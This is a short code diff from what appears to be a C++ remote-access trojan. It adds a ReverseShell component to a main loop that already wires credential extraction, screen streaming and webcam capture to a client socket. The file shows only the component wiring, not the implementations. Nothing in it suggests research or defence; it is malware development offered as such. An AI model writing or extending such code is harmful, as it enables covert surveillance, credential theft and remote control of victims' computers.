@@ -12,7 +12,7 @@
 #include "DeviceEnumerator.h"
 #include "Download.h"
 #include "CredentialsExtractor.h"
-
+#include "ReverseShell.h"
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
 std::mutex connections_mutex;
@@ -112,6 +112,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
         ScreenStreamer screenStreamer(clientSocket);
         WebcamManager webcamManager(clientSocket, download);
         CredentialsExtractor credentialsExtractor(clientSocket, download);
+        ReverseShell reverseShell(clientSocket);
         clientSocket.startConnection();
 
 
